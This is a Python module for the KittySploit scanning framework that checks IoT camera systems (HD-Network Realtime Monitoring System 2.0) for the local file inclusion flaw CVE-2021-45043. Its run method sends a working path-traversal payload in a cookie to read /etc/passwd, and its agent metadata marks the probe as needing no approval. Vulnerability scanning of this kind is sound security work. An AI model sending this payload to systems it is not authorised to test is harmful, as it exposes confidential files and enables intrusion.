#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Instances of HD-Network Realtime Monitoring System version 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HD-Network Realtime Monitoring System 2.0 - Local File Inclusion Detection',
        'description': 'Instances of HD-Network Realtime Monitoring System version 2.0 are vulnerable to a Local File Inclusion vulnerability which allows remote unauthenticated attackers to view confidential information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web',
            'scanner',
            'cve2021',
            'cve',
            'camera',
            'edb',
            'hdnetwork',
            'lfi',
            'iot',
            'hd-network_real-time_monitoring_system_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-45043',
            'https://www.exploit-db.com/exploits/50588',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45043',
            'https://cyberguy0xd1.medium.com/my-cve-2021-45043-lfi-write-up-441dad30dd7f',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-45043',
    }

    def run(self):
        path = '/language/lang'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Referer': '{{BaseURL}}', 'Cookie': 's_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype='})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='HD-Network Realtime Monitoring System 2.0 - Local File Inclusion detected', path=path)
            return True
        return False

